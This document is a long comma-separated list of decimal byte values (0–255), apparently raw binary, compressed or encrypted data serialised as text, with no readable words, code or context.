105,198,160,5,233,65,42,102,200,170,1,227,80,15,32,114,140,81,10,221,76,6,191,140,74,226,55,213,127,98,175,232,1,192,160,14,210,137,79,145,73,18,110,171,214,122,109,132,102,166,248,185,218,5,106,151,171,111,118,206,122,81,130,80,193,238,254,5,218,66,58,81,254,157,22,81,134,68,165,128,65,110,156,234,182,180,150,104,187,155,10,70,153,226,7,153,47,85,223,28,106,85,239,245,7,80,94,103,146,206,179,84,178,153,229,64,213,4,233,197,36,136,92,141,118,106,198,163,236,38,116,128,91,191,173,184,178,187,194,143,50,237,71,239,241,6,118,113,155,232,5,74,196,25,126,231,250,151,168,85,34,108,185,199,147,68,35,126,139,96,199,168,254,237,61,68,27,178,235,36,147,68,27,174,237,33,159,28,147,72,114,123,116,153,39,126,104,178,190,151,41,25,6,78,156,170,150,44,44,43,139,53,91,202,110,169,222,79,179,235,212,219,206,12,186,175,171,136,200,17,95,35,220,61,4,218,89,214,48,220,27,92,154,224,14,134,30,159,243,166,252,161,116,2,111,145,44,53,237,155,153,200,231,131,68,87,0,239,249,253,100,68,40,110,37,32,212,52,82,201,128,251,253,163,149,213,164,64,36,138,4,195,128,111,115,132,237,38,69,11,186,210,89,144,67,38,35,177,167,224,31,26,125,75,176,224,30,131,243,29,112,128,119,115,101,170,195,111,111,144,47,76,236,46,75,253,139,48,58,29,204,162,7,166,203,250,179,77,225,188,122,23,40,213,162,236,52,88,224,100,214,103,211,135,81,13,208,118,155,44,101,212,123,119,162,25,158,42,110,156,45,112,151,65,141,42,102,194,178,238,24,163,224,98,205,100,159,166,123,61,247,200,85,176,159,208,62,243,213,46,112,146,40,64,253,156,40,31,111,186,213,110,126,93,170,207,70,50,36,81,104,105,44,70,141,7,111,33,234,100,170,7,50,59,51,99,220,79,254,220,63,255,232,46,86,176,93,151,232,247,202,81,186,129,44,42,48,31,156,13,184,144,14,104,183,157,21,152,224,45,127,140,28,103,176,213,89,1,173,100,129,43,46,36,65,235,238,227,5,159,209,134,63,197,180,230,88,220,57,54,231,83,204,137,61,44,227,49,94,186,170,234,22,151,19,176,194,193,42,76,231,108,193,170,187,140,181,132,219,56,186,131,253,117,236,93,185,203,147,49,82,2,245,26,150,54,90,230,50,99,211,113,146,67,54,86,225,84,5,243,12,214,136,179,186,182,209,135,96,194,164,220,92,171,218,235,65,63,75,2,198,142,222,111,119,134,69,20,43,83,240,44,115,173,241,29,133,68,29,165,9,236,56,76,239,56,198,120,100,247,31,143,14,148,158,201,13,164,117,80,149,174,66,91,190,184,209,135,77,13,211,113,144,68,52,101,179,222,104,193,161,19,196,159,7,225,93,219,89,255,63,19,172,251,20,166,248,226,92,222,49,57,215,230,253,185,133,32,77,199,90,162,201,82,184,134,29,86,173,244,4,209,68,242,189,198,140,49,86,147,16,97,168,13,199,113,159,199,129,227,62,44,40,129,76,38,53,105,135,87,210,108,35,115,167,255,216,78,254,218,73,251,250,229,88,107,146,57,25,159,248,249,124,105,206,158,33,149,25,136,82,18,212,125,121,103,209,253,190,52,19,116,83,182,141,7,154,225,13,137,21,112,94,149,239,32,101,180,89,183,134,210,95,87,166,97,254,177,83,238,19,158,229,29,132,4,233,33,43,211,67,21,115,1,211,91,135,223,38,137,58,203,109,124,27,122,150,71,235,47,56,1,199,175,239,33,84,32,98,188,172,191,89,195,139,48,100,165,5,217,9,175,248,6,176,219,69,18,49,70,39,149,72,35,139,61,32,153,62,76,20,176,193,195,40,91,236,42,112,129,1,199,176,224,36,128,85,226,194,137,56,65,54,80,14,224,76,243,0,247,10,222,114,155,0,209,97,195,183,199,220,220,61,70,11,179,155,250,23,184,182,178,211,27,119,46,130,40,244,209,59,252,186,129,43,45,39,58,0,173,168,184,136,23,177,188,77,23,153,8,209,34,100,101,212,119,101,155,176,93,152,231,250,193,107,109,103,120,70,220,27,94,149,239,224,14,131,36,67,38,80,252,227,58,184,167,228,77,27,173,230,57,51,63,61,74,37,161,29,124,95,185,186,204,135,148,168,210,143,80,238,9,205,46,64,188,55,9,148,241,219,29,87,171,175,163,198,91,158,213,48,30,85,176,160,208,129,65,40,95,197,24,136,64,49,87,208,101,184,173,207,109,169,214,80,228,58,85,237,109,31,110,189,175,137,36,94,223,79,202,151,97,187,164,206,100,172,242,23,144,38,117,116,123,102,182,176,196,133,38,102,199,155,4,201,141,47,75,244,10,179,187,161,210,89,206,143,67,11,180,202,118,117,118,133,69,4,200,140,84,237,45,44,233,242,216,37,62,243,213,47,34,72,215,42,49,28,89,163,198,93,152,229,61,222,225,55,6,227,36,228,191,67,144,215,206,96,228,93,169,8,220,53,243,242,47,112,140,47,93,126,79,178,188,205,145,53,56,240,250,22,174,186,188,162,251,118,119,154,42,86,212,107,148,27,135,92,192,200,26,131,102,148,240,252,16,205,135,33,183,159,5,206,87,145,29,115,179,151,168,182,140,10,143,1,171,174,165,192,110,99,133,30,83,182,140,9,148,243,40,112,130,122,145,63,220,88,140,224,85,130,237,45,109,92,18,208,38,229,175,104,164,240,230,216,218,221,250,80,84,215,125,115,90,179,189,84,49,104,178,203,85,196,74,42,70,26,136,28,127,59,36,126,134,116,150,60,74,251,233,68,60,62,68,51,58,38,97,217,21,147,250,125,55,8,151,234,240,224,16,127,48,29,87,168,182,140,10,214,74,253,109,37,64,240,223,17,123,60,250,193,108,106,111,165,219,74,134,220,27,92,155,223,18,119,72,26,124,104,43,236,234,239,224,14,131,36,66,58,58,35,152,56,74,187,189,93,109,174,119,13,205,141,250,54,99,107,22,28,33,123,109,113,54,191,46,9,37,212,85,190,173,223,69,230,188,123,61,247,14,161,249,151,12,143,5,187,170,102,36,76,253,232,255,191,86,235,217,235,195,0,93,143,197,133,13,66,209,4,172,199,175,252,202,149,13,199,91,186,216,116,132,74,194,142,81,223,39,135,74,175,189,181,139,43,131,46,86,6,213,84,219,87,208,104,159,10,180,173,3,166,100,141,59,46,46,50,252,255,215,119,118,104,188,165,251,166,252,208,123,31,43,131,205,16,93,179,21,205,234,98,224,24,113,220,126,247,129,227,217,253,175,155,0,236,214,243,179,62,79,91,36,248,231,31,92,137,194,53,19,52,19,118,76,23,157,9,159,226,237,38,41,209,185,190,203,93,66,183,36,204,243,192,104,147,75,12,118,18,78,94,67,221,219,69,208,251,164,137,44,152,3,229,235,172,171,172,170,252,238,22,119,88,138,78,205,85,123,123,103,111,81,242,218,108,58,28,178,217,45,47,160,49,220,211,237,189,81,177,161,63,171,213,93,137,205,116,157,37,94,70,254,219,70,176,246,215,56,177,142,187,152,152,232,205,7,56,122,103,202,149,44,131,98,195,188,183,196,189,207,127,141,74,9,228,68,29,181,229,58,90,227,64,72,27,152,68,138,52,72,32,145,49,90,197,100,64,239,226,8,223,49,236,57,61,55,5,221,3,66,102,182,226,24,15,80,90,41,220,8,145,75,11,131,116,141,73,206,131,46,50,226,71,5,149,223,72,217,110,52,98,200,76,25,163,203,186,149,35,118,97,116,114,115,97,177,219,9,89,122,220,201,73,152,13,118,8,127,248,223,136,59,20,191,160,171,203,140,7,183,222,36,129,106,177,238,40,84,208,39,138,75,241,44,122,132,13,203,106,158,138,208,64,240,223,92,206,117,90,175,134,92,168,241,251,158,172,165,170,226,44,105,66,7,241,25,120,123,3,184,130,222,59,194,101,35,183,136,207,122,114,131,56,34,115,55,77,243,180,57,19,166,192,26,136,61,226,206,90,237,13,81,218,53,218,221,22,107,108,179,184,89,225,24,161,234,207,24,95,123,111,130,103,72,22,124,104,65,57,67,236,86,193,160,255,197,73,245,234,254,219,93,162,1,200,53,230,246,183,188,156,25,65,87,193,102,152,59,14,195,164,3,250,5,188,152,210,140,70,255,2,249,7,131,105,143,47,216,227,4,162,200,162,251,238,237,245,180,209,80,16,129,212,245,139,200,27,72,2,42,78,26,104,204,54,209,25,14,223,170,56,189,152,11,151,216,213,1,4,129,108,174,212,118,118,135,4,174,204,138,24,114,34,135,69,215,27,150,238,46,1,4,129,107,176,206,138,58,58,243,253,13,80,200,120,122,112,176,224,32,8,84,178,153,226,81,221,233,51,42,129,45,209,254,112,27,35,49,73,83,210,145,3,198,137,94,218,121,148,59,43,89,240,36,155,41,108,144,36,106,166,4,222,81,11,204,65,43,68,53,20,28,28,22,39,254,162,246,77,229,84,193,169,238,36,118,160,17,152,3,142,86,230,32,160,31,151,213,117,107,154,150,169,179,149,239,46,88,213,57,18,93,216,51,80,2,13,160,77,217,13,191,1,230,31,144,12,189,136,52,67,199,130,29,115,171,253,233,254,195,148,221,110,79,94,18,177,240,238,143,208,218,171,86,152,238,85,202,114,119,253,233,50,86,206,146,36,31,119,102,205,103,157,163,214,89,122,68,161,204,74,209,134,63,196,176,215,106,108,169,190,174,232,93,175,30,101,105,172,59,46,114,150,227,68,238,23,123,90,208,32,120,60,87,223,105,179,157,234,206,74,40,254,194,235,88,168,211,141,209,76,248,151,62,55,38,90,140,93,209,94,229,81,254,159,23,133,76,127,240,223,18,121,144,49,75,215,55,237,38,73,21,161,188,190,130,205,100,180,81,129,51,180,50,52,106,176,170,230,45,126,99,19,232,115,97,11,173,173,102,125,57,4,238,24,149,248,212,22,172,194,182,155,22,150,185,65,131,8,202,62,216,67,62,53,38,151,44,92,201,130,181,30,195,190,92,95,143,168,160,195,60,250,177,167,252,236,218,101,142,169,210,105,49,226,15,30,48,212,64,22,171,155,165,158,125,145,148,121,249,228,40,64,220,198,45,129,11,207,132,81,0,215,100,118,82,118,75,204,73,27,126,8,214,66,56,24,160,246,152,164,89,133,83,164,180,232,189,129,77,249,242,41,117,96,95,174,248,207,98,181,229,75,244,249,252,223,57,43,105,151,14,170,230,70,24,163,24,170,206,98,115,166,246,240,48,111,166,168,253,213,93,77,133,31,81,186,203,128,95,154,238,200,149,219,247,253,211,52,97,169,156,255,23,134,116,146,15,208,77,255,219,235,171,69,192,163,178,138,112,75,0,221,20,124,87,178,186,174,248,28,165,17,192,158,255,4,249,13,209,123,98,171,210,110,180,208,107,44,43,45,39,120,49,226,222,176,77,191,53,52,1,102,99,78,221,140,48,53,93,197,62,18,182,136,52,104,197,160,213,157,236,29,134,49,5,193,114,23,105,116,81,10,194,114,104,167,164,31,120,148,31,109,172,213,105,101,160,211,245,209,61,248,197,96,143,2,231,17,183,56,201,156,18,57,230,130,68,88,98,181,204,77,164,227,82,254,214,42,134,8,92,119,243,47,187,6,82,219,69,233,223,189,72,47,0,238,38,108,176,199,148,232,27,158,193,69,18,148,242,39,88,143,36,179,184,187,100,150,10,218,96,153,43,164,240,3,177,187,156,0,231,71,51,86,241,32,125,92,210,135,118,142,74,19,154,4,201,137,96,201,158,247,208,108,199,180,229,92,220,68,8,213,139,104,201,177,219,64,20,151,242,248,240,43,139,93,228,73,252,223,73,29,178,231,71,29,122,100,168,234,54,71,26,134,65,42,69,49,30,253,122,252,117,20,93,195,243,250,254,192,124,230,239,153,255,99,134,243,149,141,121,106,194,169,237,59,75,7,239,45,96,231,74,10,224,81,245,35,146,48,118,161,5,240,30,142,92,57,37,117,149,55,91,211,113,126,57,192,109,104,118,144,28,137,233,247,136,23,105,115,64,171,173,168,182,221,74,218,46,85,156,50,6,59,123,119,158,227,173,117,236,117,246,183,144,124,135,85,196,173,195,22,159,249,237,0,245,250,250,183,174,228,238,171,140,182,233,142,141,189,153,9,156,201,1,124,150,204,137,85,223,85,218,91,146,28,153,206,30,134,58,1,249,227,240,3,22,143,55,239,243,242,35,133,41,121,187,172,209,74,241,9,231,56,44,83,239,7,193,146,48,65,18,158,221,54,50,87,4,250,8,239,51,62,33,166,21,183,226,89,198,127,87,226,92,217,121,104,126,90,222,106,191,191,204,138,57,48,115,162,22,198,156,254,217,75,242,15,103,139,43,121,131,45,109,224,62,26,110,134,79,34,145,33,115,142,42,88,205,128,83,219,64,246,236,25,186,200,152,43,123,102,161,10,231,64,50,95,220,62,23,142,55,74,7,216,73,219,65,38,141,89,247,20,191,160,242,20,196,182,225,85,247,238,10,184,169,187,174,2,231,32,119,129,80,230,37,121,104,155,227,8,179,195,26,8,160,2,217,46,51,248,12,176,234,30,113,159,252,246,183,199,113,155,168,134,190,59,47,59,246,230,154,116,137,107,119,80,73,110,71,218,112,240,118,81,122,65,234,239,42,82,138,99,218,124,110,59,92,180,183,218,96,172,233,255,205,166,243,45,103,135,42,222,9,75,233,165,192,71,153,129,160,241,38,155,38,113,162,17,209,113,161,12,204,126,129,136,85,231,65,52,101,179,225,108,187,179,219,97,209,112,164,4,54,49,89,0,240,18,180,174,249,7,181,171,150,61,50,61,73,35,138,252,0,202,125,236,167,185,130,41,127,99,180,156,232,217,98,110,16,36,189,153,234,213,255,206,156,25,109,108,243,110,70,219,110,247,116,215,16,139,61,26,32,141,33,253,217,73,250,149,71,229,15,47,23,34,99,55,10,103,56,163,55,44,113,160,27,147,62,68,51,76,19,200,171,227,79,22,192,164,10,214,110,154,40,133,113,146,66,55,68,24,175,237,36,120,144,82,13,189,192,188,187,181,219,111,250,228,57,72,30,162,254,244,248,235,246,240,29,179,221,91,223,80,232,39,150,51,88,234,44,79,230,2,102,123,61,246,20,148,196,175,219,95,142,66,207,239,135,146,26,102,96,94,232,59,26,125,32,161,7,189,202,162,12,117,147,17,168,108,41,52,17,122,140,62,36,75,220,255,239,234,45,105,102,183,185,58,177,120,214,235,237,232,247,17,158,21,102,187,106,83,232,222,94,212,73,156,57,36,169,207,153,235,17,182,224,104,191,182,220,74,245,12,224,106,184,204,152,9,186,164,202,122,134,91,195,142,65,19,159,1,252,221,50,93,179,108,39,56,5,158,212,52,19,116,159,6,205,80,204,45,101,107,64,19,142,169,98,181,197,129,27,226,121,103,186,103,67,21,141,68,223,67,189,70,111,125,141,86,223,27,109,151,214,140,37,99,211,115,115,150,251,224,76,177,73,121,189,154,233,216,254,185,65,235,237,230,251,189,120,69,39,90,114,151,213,4,197,119,240,142,49,83,216,22,242,63,50,41,96,89,248,28,180,199,47,120,43,247,249,224,75,201,134,243,164,95,174,195,218,118,139,26,113,8,137,203,104,41,51,237,167,86,30,118,150,54,73,10,216,106,175,215,111,166,254,235,54,85,241,16,197,166,87,205,124,125,127,122,118,135,53,81,204,120,19,200,171,9,200,46,142,59,22,185,158,248,204,162,174,111,143,29,147,241,14,92,105,17,159,17,135,39,229,244,137,46,214,45,0,111,1,31,114,162,29,154,21,185,217,106,167,2,249,11,195,174,247,10,198,165,22,178,204,142,74,17,177,227,90,241,16,197,176,223,71,34,157,39,112,166,11,212,103,193,192,179,202,153,53,80,243,29,175,247,255,249,25,4,197,150,51,94,234,37,125,90,187,206,132,23,169,155,168,228,30,144,249,245,165,144,159,77,19,178,172,243,242,137,69,7,195,125,124,101,187,112,122,93,12,224,77,210,70,135,13,63,13,57,5,119,9,50,138,50,94,223,90,212,119,156,50,77,14,209,127,103,190,187,188,175,231,73,38,113,161,23,185,184,204,150,49,81,0,248,90,195,155,38,126,105,176,186,212,118,104,146,205,6,155,221,22,108,105,115,86,172,170,176,159,16,134,90,228,245,9,192,36,245,173,77,227,92,217,10,89,211,83,241,214,93,111,50,150,171,174,164,194,104,117,79,193,108,107,110,100,195,125,113,106,127,252,119,74,209,60,249,196,99,133,100,160,251,115,20,114,89,163,197,94,149,240,51,84,201,151,217,163,10,155,12,143,42,109,162,19,190,121,0,174,165,190,185,160,252,114,24,104,119,72,32,112,49,105,173,233,241,28,101,189,185,117,136,68,154,147,209,226,93,218,61,21,88,249,254,214,125,136,89,141,75,235,28,16,62,246,205,70,26,76,144,212,205,245,199,30,121,50,212,27,39,83,36,95,208,64,12,226,71,225,71,26,80,247,249,122,241,184,23,40,53,14,131,112,145,42,59,12,109,165,165,122,54,239,251,185,54,184,109,163,163,164,223,105,197,151,2,244,235,15,132,121,76,8,216,24,160,253,110,21,75,127,86,236,245,221,196,87,97,167,109,106,72,149,141,122,98,204,145,69,20,183,208,136,75,18,195,176,219,123,141,61,61,65,43,98,205,150,65,32,147,66,59,51,91,227,68,22,176,233,74,6,226,87,247,255,244,17,184,189,191,191,184,187,196,174,228,54,80,6,232,42,119,148,48,82,253,5,232,44,112,170,251,242,29,159,22,161,15,197,165,244,23,184,211,105,184,208,142,58,71,39,128,100,201,162,22,169,15,204,128,116,156,22,161,15,205,147,43,116,162,31,135,92,227,85,228,73,35,146,44,111,173,242,12,208,137,81,240,36,139,156,255,233,58,59,51,82,221,50,104,182,132,99,144,60,60,236,35,115,13,58,220,207,191,189,180,168,255,207,242,10,184,174,186,197,136,82,141,197,97,141,8,212,58,61,56,247,2,214,227,184,97,62,93,148,250,191,41,108,153,12,157,245,251,158,24,145,6,219,94,183,144,236,41,73,28,118,252,236,18,159,233,56,47,91,135,53,101,190,90,91,148,215,68,223,197,10,118,137,240,167,118,76,201,82,246,213,108,173,152,32,125,238,151,196,21,237,53,77,219,102,154,146,43,86,214,69,37,105,174,142,33,162,13,173,244,0,202,148,28,149,225,98,160,51,75,170,207,0,95,132,111,162,188,158,19,90,96,166,220,86,196,42,25,131,77,160,242,23,117,150,25,20,121,242,249,195,14,160,232,19,185,144,34,135,35,109,108,90,183,17,190,208,0,181,29,124,121,88,4,252,239,174,187,59,241,164,178,102,172,144,4,96,141,8,151,234,239,226,9,223,68,19,126,67,202,143,23,170,127,195,39,68,119,10,224,218,62,74,14,105,63,30,81,255,205,232,180,100,44,3,53,204,74,208,62,246,206,70,221,95,179,104,182,161,13,87,62,183,149,132,225,91,105,180,165,238,176,223,254,129,15,246,74,8,222,8,183,164,2,185,176,107,189,183,146,103,143,51,68,246,180,179,176,171,213,111,117,144,205,219,224,25,247,136,100,92,6,180,142,31,164,209,120,130,117,143,65,253,231,198,175,245,41,103,151,27,56,93,159,249,199,71,240,103,189,209,252,194,243,240,252,47,120,134,40,70,135,13,62,14,53,16,85,111,255,37,98,208,141,72,11,214,131,119,125,126,137,95,198,167,18,188,176,231,82,9,200,160,34,131,90,228,72,119,108,163,26,174,218,91,183,203,94,194,53,78,205,113,96,125,79,73,22,200,24,107,252,16,70,229,34,124,105,196,165,209,10,171,2,187,247,166,245,8,235,51,51,49,239,159,210,55,10,145,250,191,112,95,146,249,196,162,174,112,138,11,210,85,81,121,22,23,65,144,26,182,219,80,228,209,250,193,106,113,92,154,224,15,128,46,37,63,68,29,122,144,80,3,144,63,216,226,0,144,23,101,50,195,76,5,123,35,157,238,73,10,109,133,222,196,85,254,246,193,144,60,16,192,62,135,219,40,204,11,222,239,97,211,80,174,202,144,19,184,86,62,181,154,115,21,190,77,68,43,101,168,171,210,120,79,236,240,206,91,37,131,127,242,222,161,240,30,104,212,141,61,198,115,18,107,53,0,125,105,90,164,127,48,29,87,171,174,163,198,163,227,50,205,4,161,203,76,203,77,198,91,239,27,127,130,121,134,6,221,254,112,86,144,24,100,53,186,101,187,89,136,108,129,145,51,241,251,125,232,234,60,58,244,247,9,120,6,180,178,213,72,161,182,174,204,34,108,169,191,182,184,56,13,51,51,20,28,118,101,155,31,94,185,194,113,133,35,52,43,183,205,162,136,27,235,18,182,161,40,145,47,238,251,122,51,222,6,106,160,182,147,181,144,253,183,207,96,189,44,45,68,17,48,199,97,171,126,114,98,156,186,135,115,29,100,5,9,149,11,219,207,91,178,206,74,236,42,82,174,247,14,162,230,229,84,240,244,22,92,22,181,193,133,115,71,48,52,82,132,243,120,15,179,175,153,251,90,52,79,230,58,8,169,147,251,21,55,23,235,88,168,210,135,204,101,149,37,70,250,2,201,83,209,130,71,9,74,205,81,206,35,77,33,19,132,166,38,62,17,199,11,166,208,117,85,203,142,36,90,72,230,15,150,211,165,118,135,80,237,249,224,19,212,88,243,2,198,163,240,25,85,5,139,196,34,96,181,128,209,224,133,59,222,136,15,34,78,129,42,47,32,151,9,102,187,104,67,201,198,218,87,241,207,98,165,20,182,170,206,46,121,128,69,34,55,133,103,169,205,154,211,140,34,136,226,217,195,45,90,186,122,88,67,122,125,91,221,5,87,105,139,53,1,79,103,239,250,160,68,217,193,134,97,168,228,185,133,59,44,255,182,53,25,150,29,98,151,205,133,42,72,142,208,212,230,149,155,106,142,91,227,24,118,131,98,66,146,4,214,91,167,201,57,67,251,37,129,234,138,234,238,17,145,60,15,125,215,71,49,105,166,227,210,66,27,142,15,145,223,79,167,139,53,149,164,247,201,24,111,125,143,10,181,200,165,22,176,242,42,96,179,206,145,85,243,24,167,222,25,110,150,27,102,139,242,24,124,119,234,103,100,22,33,241,150,139,42,135,90,174,181,60,237,160,234,163,198,52,210,216,155,1,239,29,141,70,17,13,171,231,86,4,215,104,124,225,22,159,0,184,149,210,126,90,238,18,149,54,56,66,209,121,76,242,233,8,216,83,113,76,13,153,36,69,55,239,133,242,50,85,235,251,106,100,97,203,79,77,236,40,76,228,108,95,199,136,233,40,148,89,188,240,181,179,211,61,40,107,133,240,241,254,245,212,9,225,107,159,98,140,200,85,174,163,17,174,213,57,19,90,224,251,158,8,129,102,177,78,183,181,145,90,37,94,237,39,31,245,163,31,141,65,248,116,72,181,207,67,113,181,110,165,0,220,96,184,193,64,172,170,177,156,38,111,144,7,169,152,36,78,3,224,34,120,105,195,104,100,160,125,15,3,196,187,189,92,62,201,175,222,78,210,230,242,183,203,80,73,29,12,215,104,147,31,100,191,168,131,77,246,220,48,75,181,170,226,56,23,151,63,230,185,132,35,70,36,100,85,188,224,24,150,33,101,80,208,96,207,68,185,210,152,26,232,0,205,133,42,111,156,240,15,162,23,108,89,192,28,51,165,32,246,232,103,210,66,15,189,198,172,253,24,178,200,124,119,155,46,119,170,252,222,47,119,142,33,106,91,238,31,117,159,35,137,252,8,201,121,39,125,85,222,202,16,128,47,32,153,22,155,231,8,122,128,59,11,21,13,131,115,158,14,107,137,106,121,155,242,239,73,200,140,58,214,98,230,99,160,70,167,197,133,93,131,6,209,37,120,121,247,188,164,195,196,243,55,188,150,251,235,45,51,86,231,15,176,192,189,121,48,59,172,132,177,254,71,152,231,248,198,166,222,231,55,20,130,177,57,255,255,251,248,173,195,214,131,45,70,8,233,58,37,102,181,181,184,174,222,55,44,81,241,39,118,139,92,218,23,168,194,118,211,212,46,111,169,236,209,88,0,183,174,223,99,220,102,189,187,174,203,137,100,216,115,159,35,104,145,79,6,184,164,173,248,0,208,144,80,3,144,77,250,231,221,91,186,174,91,92,155,221,22,184,184,181,154,239,196,162,210,119,161,244,204,237,216,11,169,10,208,42,19,169,157,16,179,74,197,140,12,233,134,127,222,30,117,143,14,195,159,230,45,73,34,75,188,150,155,182,27,195,21,123,92,216,51,37,200,244,206,145,69,27,48,221,23,106,112,170,229,48,40,71,190,178,161,0,225,2,72,127,48,226,136,51,107,173,148,212,104,98,195,152,153,215,83,182,235,127,149,155,231,26,159,222,86,232,11,189,152,54,16,109,132,208,22,250,34,243,225,42,110,113,108,243,114,82,3,236,36,40,68,9,162,5,222,82,193,137,82,157,170,219,163,122,119,73,151,242,226,39,119,85,189,254,81,182,216,111,155,197,106,143,65,246,219,166,91,153,46,107,168,136,212,51,23,107,192,169,214,125,136,90,137,81,199,105,250,93,146,68,42,106,100,165,253,193,169,12,179,142,167,171,158,248,5,167,236,31,72,117,249,193,47,139,16,156,8,76,114,99,184,181,154,241,193,178,190,193,153,2,238,13,194,82,248,209,97,117,96,172,147,63,37,44,130,15,48,15,185,131,94,98,58,175,198,155,200,8,84,203,3,115,245,108,67,72,0,114,7,189,182,164,21,116,253,57,38,39,41,86,236,209,15,223,94,208,70,150,5,87,231,8,156,151,232,246,205,147,39,105,126,66,204,137,40,147,65,18,81,212,121,78,113,21,131,13,166,21,176,171,242,4,79,198,60,193,21,226,42,52,208,63,240,223,90,192,64,60,50,89,158,20,136,113,167,224,231,18,189,129,214,230,15,104,203,146,20,143,235,64,43,81,12,219,96,120,141,27,108,160,11,91,225,40,102,51,210,57,5,160,25,149,30,93,166,159,17,135,21,225,33,105,62,173,198,82,203,21,120,106,176,133,196,20,45,216,92,222,9,188,84,207,152,38,34,5,182,208,99,126,248,246,211,200,249,178,174,0,248,236,196,126,123,71,133,217,54,48,224,49,90,184,234,21,35,129,75,226,18,100,171,215,244,163,182,161,38,135,63,201,109,172,179,66,163,215,77,103,55,8,150,237,51,72,6,167,200,57,67,243,30,168,183,76,106,6,124,98,126,245,230,145,25,187,187,136,18,236,1,203,26,26,127,40,73,152,226,19,151,41,26,5,79,124,233,41,120,60,35,33,86,203,94,217,99,174,98,137,18,120,147,40,103,131,52,245,15,153,36,43,72,127,25,116,19,68,238,210,165,219,115,148,10,228,6,70,95,178,131,23,195,70,30,152,22,176,201,143,214,212,241,220,28,92,229,33,29,151,207,240,209,116,83,240,173,87,89,244,143,53,75,11,176,102,146,57,35,133,60,9,121,163,253,13,171,106,174,240,211,140,211,77,7,186,191,142,21,98,211,225,55,255,6,225,40,82,139,202,79,193,109,104,117,80,192,174,186,231,58,189,18,80,188,168,204,139,33,69,125,84,9,209,39,237,167,211,235,188,27,250,152,73,253,122,239,58,222,84,244,2,237,18,180,139,113,239,159,210,57,4,230,24,149,166,122,65,237,233,64,33,123,71,232,218,94,170,19,183,123,21,159,144,115,80,94,176,244,18,143,105,182,74,107,71,215,87,192,175,180,142,164,16,189,108,169,158,134,220,52,199,39,219,185,90,3,210,253,104,207,32,143,69,15,197,137,78,189,217,185,44,231,248,197,96,206,43,221,9,203,78,253,132,211,229,75,134,112,169,209,32,142,64,6,221,229,29,175,232,8,166,244,16,55,200,85,175,162,7,166,211,236,182,35,251,87,88,52,47,121,150,57,77,11,71,130,229,254,180,147,65,29,135,36,80,162,7,133,249,236,246,133,132,25,172,185,70,1,229,243,175,199,153,250,20,112,61,36,40,41,232,22,38,210,93,213,28,58,70,0,130,199,10,56,249,241,92,185,220,90,168,222,37,83,247,245,138,3,233,4,226,9,235,6,241,224,184,7,187,105,100,166,250,203,147,71,219,226,168,73,179,192,101,63,6,61,26,159,182,50,201,13,54,67,40,43,87,141,11,75,207,66,232,64,16,80,254,160,167,223,27,20,215,30,156,232,186,164,252,173,116,148,2,214,249,3,189,201,80,158,0,147,233,168,215,229,137,49,117,142,13,163,145,145,220,77,192,32,245,139,204,46,10,156,2,176,205,165,17,161,244,12,176,199,136,102,161,231,57,20,159,157,21,134,112,92,121,110,74,195,23,137,208,202,109,186,191,123,108,151,13,107,162,212,224,249,249,152,183,147,23,114,131,112,178,239,34,113,127,106,186,211,140,80,226,34,156,29,115,115,41,240,223,18,121,66,233,244,210,132,86,219,39,73,183,201,95,200,134,61,181,162,210,144,10,105,152,234,12,225,89,204,96,209,33,195,141,33,91,245,229,98,201,70,183,187,62,106,106,28,127,113,71,186,200,124,16,32,0,87,156,7,26,111,137,35,133,98,216,43,236,233,244,210,55,9,147,244,30,134,77,210,71,191,178,176,237,212,244,242,202,23,165,244,166,248,7,212,11,172,2,222,251,206,97,215,105,124,128,165,237,12,151,66,245,21,195,105,55,167,76,168,222,10,80,213,209,94,210,68,24,150,12,71,234,248,31,94,108,145,13,171,251,229,23,172,144,106,132,70,236,33,68,57,27,177,154,192,152,203,65,159,241,149,132,71,25,108,136,229,151,202,132,28,12,49,215,231,219,4,176,196,105,160,29,145,33,116,138,53,57,46,102,161,242,252,250,202,125,99,169,150,34,84,96,120,122,22,61,2,202,88,198,134,103,191,150,21,170,216,80,232,56,43,83,220,75,13,191,174,199,95,80,189,118,75,206,69,224,15,206,119,121,77,213,19,180,159,227,149,164,246,224,146,183,225,49,33,20,117,109,189,183,159,43,113,141,52,64,124,200,197,182,163,4,138,43,215,18,139,207,18,131,17,230,9,187,189,141,86,154,163,230,237,174,225,62,199,150,45,100,101,134,219,28,91,158,213,47,34,73,30,119,29,151,245,225,154,149,38,81,64,176,246,241,226,209,74,40,254,189,154,19,163,22,174,182,92,182,226,26,159,11,191,197,162,229,28,68,34,85,191,0,99,187,147,123,253,14,169,186,73,214,73,41,104,92,171,202,157,23,113,163,63,33,112,106,198,65,144,174,96,62,42,115,75,246,178,188,130,71,3,243,46,120,146,69,14,175,237,64,65,54,83,216,73,249,246,16,183,204,111,106,145,31,140,96,240,55,92,218,74,253,12,236,68,56,70,0,210,94,199,156,18,182,167,255,205,116,8,84,178,152,231,248,197,96,142,67,210,234,175,188,48,236,139,168,141,106,156,156,138,92,41,246,3,182,184,85,204,162,235,123,2,225,29,132,254,42,100,192,167,186,55,13,223,39,138,255,114,120,55,209,120,123,17,185,196,157,187,160,13,158,37,46,231,26,81,130,99,184,90,221,87,229,216,50,56,70,233,4,49,209,111,117,213,239,57,41,58,199,106,208,44,95,193,112,100,63,240,221,23,106,113,90,159,16,107,31,15,155,147,194,9,47,249,39,102,65,156,36,249,16,189,147,31,100,193,164,145,37,110,117,100,174,141,35,120,120,89,209,144,10,172,2,222,250,210,85,249,2,176,230,129,126,87,240,182,73,210,56,5,159,209,59,254,244,189,41,242,243,140,217,196,254,139,111,141,203,253,1,96,217,96,170,219,48,90,205,250,242,1,245,243,233,31,55,37,114,135,42,95,229,9,176,245,4,137,39,87,244,18,130,111,230,79,227,73,170,109,102,123,61,247,202,80,191,177,179,212,210,174,144,148,168,90,91,61,21,198,156,232,7,70,208,246,231,171,174,122,254,82,44,83,16,189,172,237,40,118,128,112,163,13,196,192,176,211,121,132,175,196,151,49,102,188,175,224,18,54,11,141,8,150,236,234,241,45,97,175,244,37,132,11,225,90,237,44,226,198,92,155,220,96,172,215,222,187,60,251,190,117,156,13,183,147,3,137,82,159,124,233,127,215,247,245,222,126,81,17,178,128,65,7,229,63,250,7,18,166,226,22,195,114,85,34,93,183,86,102,157,207,84,121,74,243,220,58,38,119,154,58,65,48,92,194,147,72,48,95,213,107,147,27,133,85,247,5,232,27,156,228,9,79,249,158,151,248,222,249,245,231,135,30,20,115,84,178,229,49,76,212,64,210,119,46,201,255,140,27,25,113,56,36,152,36,87,2,236,27,139,60,136,163,51,108,130,106,88,192,23,79,211,248,151,245,187,232,2,206,131,13,50,197,236,147,196,142,19,230,0,108,105,116,82,3,215,89,172,